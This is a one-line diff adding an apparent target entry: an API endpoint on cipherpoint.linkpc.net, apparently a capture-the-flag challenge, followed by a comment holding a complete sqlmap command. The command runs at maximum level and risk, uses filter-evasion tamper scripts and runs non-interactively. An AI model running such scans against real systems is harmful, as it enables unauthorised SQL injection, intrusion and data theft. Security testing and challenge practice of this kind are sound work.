@@ -1,0 +1,1 @@
+https://cipherpoint.linkpc.net/api/challenges/3 (GET)  # /usr/bin/sqlmap -u https://cipherpoint.linkpc.net/api/challenges/3 --level=5 --risk=3 --tamper=space2comment,randomcase --batch --output-dir=sqlmap_results
